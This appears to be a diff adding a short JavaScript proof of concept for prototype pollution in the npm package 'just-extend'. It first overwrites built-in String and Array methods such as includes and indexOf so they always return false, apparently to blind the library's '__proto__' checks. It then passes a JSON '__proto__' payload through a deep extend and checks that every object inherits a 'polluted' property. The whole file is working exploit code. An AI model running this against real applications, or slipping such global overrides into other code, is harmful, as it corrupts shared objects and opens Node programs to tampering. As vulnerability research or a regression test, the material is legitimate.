@@ -1,0 +1,16 @@
+String.prototype.includes = () => false;
+String.prototype.startsWith = () => false;
+String.prototype.endsWith = () => false;
+String.prototype.indexOf = () => -1;
+String.prototype.lastIndexOf = () => false;
+String.prototype.match = () => false;
+String.prototype.search = () => false;
+String.prototype.matchAll = () => false;
+Array.prototype.includes = () => false;
+Array.prototype.indexOf = () => -1;
+const extend = require('just-extend');
+let obj = {};
+console.log({}.polluted);
+let payload2 = JSON.parse('{"__proto__": {"polluted": "yes"}}');
+extend(true, {}, payload2);
+console.log({}.polluted);
